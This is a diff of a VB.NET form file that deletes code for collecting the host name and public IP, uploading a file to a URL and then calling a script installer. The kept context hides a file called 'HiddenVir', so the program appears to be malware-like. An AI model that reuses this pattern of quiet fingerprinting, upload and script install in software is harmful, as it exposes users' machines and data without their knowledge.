@@ -56,9 +56,6 @@ Public Class Form1
 
     End Sub
 
-    Public Sub ScriptInstaller()
-
-
     Private Function FixPath(ByVal illegal As String) As String
         Return String.Join("", illegal.Split(System.IO.Path.GetInvalidFileNameChars()))
     End Function
@@ -69,65 +66,6 @@ Public Class Form1
             HiddenVir.Attributes = FileAttributes.Hidden
         End If
     End Sub
-
-#Region " Private Methods "
-
-    Public Function Gethotsname() As String
-        Dim strHostName As String = System.Net.Dns.GetHostName()
-        Return strHostName
-    End Function
-
-    Public Function GetIp() As String
-        Dim Currentip As String = GetHTMLPage(IpURL)
-        Return Currentip
-    End Function
-
-    Private Function GetHTMLPage(ByVal Url As String) As String
-        Try
-            Dim UrlHost As String = New Uri(Url).Host
-            System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls12
-            Dim cookieJar As CookieContainer = New CookieContainer()
-            Dim request As HttpWebRequest = CType(WebRequest.Create(Url), HttpWebRequest)
-            request.UseDefaultCredentials = True
-            request.Proxy.Credentials = System.Net.CredentialCache.DefaultCredentials
-            request.CookieContainer = cookieJar
-            request.Accept = "text/html, application/xhtml+xml, */*"
-            request.Referer = "https://" + UrlHost + "/"
-            request.Headers.Add("Accept-Language", "en-GB")
-            request.UserAgent = "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)"
-            request.Host = UrlHost
-            Dim response As HttpWebResponse = CType(request.GetResponse(), HttpWebResponse)
-            Dim htmlString As String = String.Empty
-
-            Using reader = New StreamReader(response.GetResponseStream())
-                htmlString = reader.ReadToEnd()
-            End Using
-
-            Return htmlString
-        Catch ex As Exception
-            Return ""
-        End Try
-    End Function
-
-#End Region
-
-#Region " Send Messaje "
-
-    Private WithEvents Client As New WebClient
-
-    Private Sub UploadAsync(ByVal url As String, ByVal FiletPath As String)
-        Client.UploadFileAsync(New Uri(url), FiletPath)
-    End Sub
-
-    Private Sub Client_UploadProgressChanged(sender As Object, e As UploadProgressChangedEventArgs) Handles Client.UploadProgressChanged
-        ' Dim ValueP as integer = e.ProgressPercentage
-    End Sub
-
-    Private Sub Client_UploadFileCompleted(sender As Object, e As UploadFileCompletedEventArgs) Handles Client.UploadFileCompleted
-        ScriptInstaller()
-    End Sub
-
-#End Region
 
 #Region " My Application Is Already Running "
 
